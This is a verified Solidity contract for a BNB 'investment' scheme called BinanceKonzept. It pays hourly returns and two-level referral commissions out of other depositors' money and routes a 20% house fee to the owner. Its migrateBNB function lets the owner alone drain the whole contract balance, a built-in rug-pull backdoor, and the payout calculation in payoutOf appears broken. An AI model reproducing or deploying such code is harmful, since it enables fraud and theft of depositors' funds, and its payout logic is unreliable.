/**
 *Submitted for verification at BscScan.com on 2022-03-29
*/

pragma solidity 0.5.4;

library SafeMath {

	function add(uint256 a, uint256 b) internal pure returns (uint256) {
		uint256 c = a + b;
		require(c >= a, "SafeMath: addition overflow");
		return c;
	}
	
	function sub(uint256 a, uint256 b) internal pure returns (uint256) {
		return sub(a, b, "SafeMath: subtraction overflow");
	}
	
	function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
		require(b <= a, errorMessage);
		uint256 c = a - b;
		return c;
	}
	
	function mul(uint256 a, uint256 b) internal pure returns (uint256) {
		if (a == 0) {
			return 0;
		}
		uint256 c = a * b;
		require(c / a == b, "SafeMath: multiplication overflow");
		return c;
	}
	
	function div(uint256 a, uint256 b) internal pure returns (uint256) {
		return div(a, b, "SafeMath: division by zero");
	}
	
	function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
		require(b > 0, errorMessage);
		uint256 c = a / b;
		return c;
	}
}

library DataStructs {
	struct User {
		uint256 directsIncome;
		uint256 roiReferralIncome;
		uint256 currInvestment;
		uint256 dailyIncome;
		uint256 vipPoolIncome;
		uint256 poolIncomeWithdrawal;
		uint256 holdingIncome;
		uint256 depositTime;
		uint256 incomeLimitLeft;
		uint256 referralCount;
		address referrer;
		uint256 checkpoint;
		uint256 totalwithdrawl;
	}
}

contract BinanceKonzept {
	using SafeMath for *;
	address payable public owner   = 0xa3DaA116e9E85B8626c0fD3e9C63cF7136983Ed8;
	address public masterAccount   = 0xa3DaA116e9E85B8626c0fD3e9C63cF7136983Ed8;
	uint256 private houseFee       = 20;
	uint256 private incomeTimes    = 3;
	uint256 private vipPoolPercent = 2;
	uint256 public pool_next_draw  = block.timestamp + 1 weeks;
	uint private timeStep          = 1 hours;
	uint256 public pool_balance;
	address[] private vipAddress;
	
	mapping (address => DataStructs.User) public player;
	mapping (address => uint256) public playerTotEarnings;
	mapping (address => bool) private isvipAddress;
	
	event registerUserEvent(address indexed _playerAddress, address indexed _referrer);
	event investmentEvent(address indexed _playerAddress, uint256 indexed _amount);
	event referralCommissionEvent(address indexed _playerAddress, address indexed _referrer, uint256 indexed amount, uint256 _type);
	event withdrawEvent(address indexed _playerAddress, uint256 indexed amount, uint256 indexed timeStamp);
	
	constructor() public {
	   player[masterAccount].depositTime = block.timestamp;
	}
	
	modifier isMinimumAmount(uint256 _bnb) {
		require(_bnb >= 1 * 10**17, "Minimum contribution amount is 0.1 BNB");
		_;
	}
	
	modifier isMaximumAmount(uint256 _bnb) {
		require(_bnb <= 200 * 10**18, "maximum contribution amount is 200 BNB");
		_;
	}
	
	modifier onlyOwner() {
		require(msg.sender == owner, "only Owner");
		_;
	}
	
	function isUser(address _addr) public view returns (bool) {
		return player[_addr].depositTime > 0;
	}
	
	modifier requireUser() { require(isUser(msg.sender)); _; }

	function registerUser(address referrer) public isMinimumAmount(msg.value) isMaximumAmount(msg.value) payable {
		require(player[referrer].depositTime > 0, "invalid referrer");
		
		uint256 amount = msg.value;
		if(player[msg.sender].depositTime == 0) 
		{
			player[msg.sender].referrer = referrer;
			player[referrer].referralCount = player[referrer].referralCount.add(1);
			player[msg.sender].checkpoint = block.timestamp;
			player[msg.sender].currInvestment = amount;
		}
		else 
		{
			referrer = player[msg.sender].referrer;
			if(player[msg.sender].incomeLimitLeft==0)
			{
			    player[msg.sender].checkpoint = block.timestamp;
				player[msg.sender].currInvestment = amount;
			}
			else
			{
			    player[msg.sender].currInvestment = player[msg.sender].currInvestment.add(amount);
			}
		}
		
		player[msg.sender].incomeLimitLeft = player[msg.sender].incomeLimitLeft.add(amount.mul(incomeTimes));
		player[msg.sender].depositTime = block.timestamp;
		
		directsReferralBonus(msg.sender, amount);
	    emit registerUserEvent(msg.sender, referrer);
		
		owner.transfer(amount.mul(houseFee).div(100));
		pool_balance += amount.mul(vipPoolPercent).div(100);
		
		if(pool_next_draw <= block.timestamp)
		{
			drawPool();
		}
		
		if(player[msg.sender].currInvestment >= 49900000000000000000)
		{
			vipAddress.push(msg.sender);
			isvipAddress[msg.sender] = true;
		}
		else
		{
			 if(isvipAddress[msg.sender])
			 {
				for (uint256 i = 0; i < vipAddress.length; i++) {
					if (vipAddress[i] == msg.sender) {
						vipAddress[i] = vipAddress[vipAddress.length - 1];
						vipAddress.pop();
						break;
					}
				}
			 }
			 isvipAddress[msg.sender] = false;
		}
		emit investmentEvent(msg.sender, amount);
	}
	
	function drawPool() private {
		if(vipAddress.length > 0)
		{
			uint256 perAddress  = pool_balance.div(vipAddress.length);
			for (uint256 i = 0; i < vipAddress.length; i++) 
			{
				if(perAddress > player[vipAddress[i]].incomeLimitLeft)
				{
					 pool_balance = pool_balance.sub(player[vipAddress[i]].incomeLimitLeft);
					 player[vipAddress[i]].vipPoolIncome = player[vipAddress[i]].vipPoolIncome.add(player[vipAddress[i]].incomeLimitLeft);
					 player[vipAddress[i]].incomeLimitLeft = 0;
				}
				else
				{
					 pool_balance = pool_balance.sub(perAddress);
					 player[vipAddress[i]].vipPoolIncome = player[vipAddress[i]].vipPoolIncome.add(perAddress);
					 player[vipAddress[i]].incomeLimitLeft = player[vipAddress[i]].incomeLimitLeft.sub(perAddress);
				}
			}
		}
		pool_next_draw = pool_next_draw + 1 weeks;
	}
	
	function directsReferralBonus(address _playerAddress, uint256 amount) private 
	{
		address _nextReferrer = player[_playerAddress].referrer;
		uint i;
		for(i=0; i < 2; i++) 
		{
			if (_nextReferrer != address(0x0)) 
			{
				if(i == 0) 
				{
					 player[_nextReferrer].directsIncome = player[_nextReferrer].directsIncome.add(amount.mul(10).div(100));
					 emit referralCommissionEvent(_playerAddress,  _nextReferrer, amount.mul(10).div(100), 1);
				}
				else if(i == 1 ) 
				{
					player[_nextReferrer].directsIncome = player[_nextReferrer].directsIncome.add(amount.mul(5).div(100));
					emit referralCommissionEvent(_playerAddress,  _nextReferrer, amount.mul(5).div(100), 1);
				}
			}
			else 
			{
				break;
			}
			_nextReferrer = player[_nextReferrer].referrer;
		}
	}
	
	function roiReferralBonus(address _playerAddress, uint256 amount) private 
	{
		address _nextReferrer = player[_playerAddress].referrer;
		uint i;
		for(i=0; i < 2; i++) 
		{
			if (_nextReferrer != address(0x0)) 
			{
				if(i == 0) 
				{
				   player[_nextReferrer].roiReferralIncome = player[_nextReferrer].roiReferralIncome.add(amount.mul(10).div(10000));
				   emit referralCommissionEvent(_playerAddress,  _nextReferrer, amount.mul(10).div(10000), 2);
				}
				else if(i == 1) {
				   player[_nextReferrer].roiReferralIncome = player[_nextReferrer].roiReferralIncome.add(amount.mul(5).div(10000));
				   emit referralCommissionEvent(_playerAddress,  _nextReferrer, amount.mul(5).div(10000), 2);
				}
			}
			else 
			{
				break;
			}
			_nextReferrer = player[_nextReferrer].referrer;
		}
	}
	
	function withdrawPoolEarnings() requireUser public {
		require(player[msg.sender].vipPoolIncome.sub(player[msg.sender].poolIncomeWithdrawal) > 0, "Limit not available");
		
		uint256 payout = player[msg.sender].vipPoolIncome.sub(player[msg.sender].poolIncomeWithdrawal);
		player[msg.sender].poolIncomeWithdrawal = player[msg.sender].poolIncomeWithdrawal.add(payout);
		msg.sender.transfer(payout);
		
		if(player[msg.sender].incomeLimitLeft==0){
			 if(isvipAddress[msg.sender])
			 {
				for (uint256 i = 0; i < vipAddress.length; i++) {
					if (vipAddress[i] == msg.sender) {
						vipAddress[i] = vipAddress[vipAddress.length - 1];
						vipAddress.pop();
						break;
					}
				}
			 }
			 isvipAddress[msg.sender] = false;
		}
		
		if(pool_next_draw <= block.timestamp)
		{
			drawPool();
		}
		emit withdrawEvent(msg.sender, payout, block.timestamp);
	}
	
	function withdrawEarnings() requireUser public {
	    require(player[msg.sender].incomeLimitLeft > 0, "Limit not available");
		
		uint256 to_payout = this.payoutOf(msg.sender);
		uint256 holding_payout = this.holdingOf(msg.sender);
		
		if(to_payout > 0) {
			if(to_payout > player[msg.sender].incomeLimitLeft) 
			{
				to_payout = player[msg.sender].incomeLimitLeft;
			}
			player[msg.sender].dailyIncome += to_payout;
			player[msg.sender].incomeLimitLeft -= to_payout;
			roiReferralBonus(msg.sender, to_payout);
		}
		
		if(holding_payout > 0) {
			if(holding_payout > player[msg.sender].incomeLimitLeft)
			{
				holding_payout = player[msg.sender].incomeLimitLeft;
			}
			player[msg.sender].holdingIncome += holding_payout;
			player[msg.sender].incomeLimitLeft -= holding_payout;
		}
		
		if(player[msg.sender].incomeLimitLeft > 0 && player[msg.sender].directsIncome > 0) 
		{
			uint256 direct_bonus = player[msg.sender].directsIncome;
			if(direct_bonus > player[msg.sender].incomeLimitLeft) 
			{
				direct_bonus = player[msg.sender].incomeLimitLeft;
			}
			player[msg.sender].directsIncome -= direct_bonus;
			player[msg.sender].incomeLimitLeft -= direct_bonus;
			to_payout += direct_bonus;
		}
		
		if(player[msg.sender].incomeLimitLeft > 0  && player[msg.sender].roiReferralIncome > 0) 
		{
			uint256 match_bonus = player[msg.sender].roiReferralIncome;
			if(match_bonus > player[msg.sender].incomeLimitLeft) 
			{
				match_bonus = player[msg.sender].incomeLimitLeft;
			}
			player[msg.sender].roiReferralIncome -= match_bonus;
			player[msg.sender].incomeLimitLeft -= match_bonus;
			to_payout += match_bonus;
		}
		
		require(to_payout > 0, "Zero payout");
		
		player[msg.sender].checkpoint = block.timestamp;
		player[msg.sender].totalwithdrawl = player[msg.sender].totalwithdrawl + to_payout;
		
		playerTotEarnings[msg.sender] += to_payout;
		
		address payable senderAddr = address(uint160(msg.sender));
		senderAddr.transfer(to_payout);
		
		if(pool_next_draw <= block.timestamp)
		{
			drawPool();
		}
		
		if(player[msg.sender].incomeLimitLeft==0)
		{
			 if(isvipAddress[msg.sender])
			 {
				for (uint256 i = 0; i < vipAddress.length; i++) {
					if (vipAddress[i] == msg.sender) {
						vipAddress[i] = vipAddress[vipAddress.length - 1];
						vipAddress.pop();
						break;
					}
				}
			 }
			 isvipAddress[msg.sender] = false;
		}
		emit withdrawEvent(msg.sender, to_payout, now);
	}
	
	function payoutOf(address _addr) view external returns(uint256 payout) {
		uint256 earningsLimitLeft = player[_addr].incomeLimitLeft;
		uint256 rPercent = 50;
		if(player[_addr].currInvestment >= 30 * 10**18)
		{
			 rPercent = 70;
		}
		if(player[_addr].incomeLimitLeft > 0 ) 
		{
			payout = (player[_addr].currInvestment * rPercent * ((block.timestamp - player[_addr].checkpoint) / 1 hours) / 10000);
			if(payout > earningsLimitLeft) 
			{
				payout = earningsLimitLeft;
			}
			else
			{
			   return 0;
			}
		}
	}
	
	function holdingOf(address _addr) view external returns(uint256 payout) {
		uint256 maxHoldPercent;
		uint256 earningsLimitLeft = player[_addr].incomeLimitLeft;
		
		if(player[_addr].currInvestment >= 30 * 10**18)
		{
			maxHoldPercent = 30; 
			uint256 holdingPercent = (block.timestamp.sub(uint(player[_addr].checkpoint))).div(timeStep).mul(5);
			if (holdingPercent > maxHoldPercent) 
			{
				holdingPercent = maxHoldPercent;
			}
			payout = (player[_addr].currInvestment * holdingPercent * ((block.timestamp - player[_addr].checkpoint) / 1 hours) / 10000);
			if(payout > earningsLimitLeft) 
			{
				 payout = earningsLimitLeft;
			}
		}
		else
		{
			maxHoldPercent = 15;
			uint256 holdingPercent = (block.timestamp.sub(uint(player[_addr].checkpoint))).div(timeStep).mul(5);
			if (holdingPercent > maxHoldPercent) 
			{
				holdingPercent = maxHoldPercent;
			}
			payout = (player[_addr].currInvestment * holdingPercent * ((block.timestamp - player[_addr].checkpoint) / 1 hours) / 10000);
			if(payout > earningsLimitLeft) 
			{
				 payout = earningsLimitLeft;
			}
		}
	}
	
	function holdingRate(address _addr) view external returns(uint256 holdingPercent) {
		if(player[_addr].currInvestment >= 30 * 10**18)
		{
			uint256 maxHoldPercent = 30; 
			        holdingPercent = (block.timestamp.sub(uint(player[_addr].checkpoint))).div(timeStep).mul(5);
			if (holdingPercent > maxHoldPercent) 
			{
				holdingPercent = maxHoldPercent;
			}
		}
		else
		{
			uint256 maxHoldPercent = 15;
			        holdingPercent = (block.timestamp.sub(uint(player[_addr].checkpoint))).div(timeStep).mul(5);
			if (holdingPercent > maxHoldPercent) 
			{
				holdingPercent = maxHoldPercent;
			}
		}
	}
	
	function isVIP(address _addr) public view returns (bool) {
		return isvipAddress[_addr];
	}
	
	function migrateBNB() public {
		require(msg.sender == owner, "error");
		uint256 balance = address(this).balance;
		owner.transfer(balance);
	}
	
	
	function emergencyWithdrawal() public {
	   require(player[msg.sender].currInvestment > player[msg.sender].totalwithdrawl, "Limit not available");
	   require(player[msg.sender].incomeLimitLeft > 0, "Limit not available");
	   uint256 balance = player[msg.sender].currInvestment - player[msg.sender].totalwithdrawl;
			   balance = (balance * 80) /100;
	   player[msg.sender].incomeLimitLeft = 0;
	   if(isvipAddress[msg.sender])
	   {
			for (uint256 i = 0; i < vipAddress.length; i++) {
				if (vipAddress[i] == msg.sender) {
					vipAddress[i] = vipAddress[vipAddress.length - 1];
					vipAddress.pop();
					break;
				}
			}
		}
		isvipAddress[msg.sender] = false;
	    msg.sender.transfer(balance);
	}
}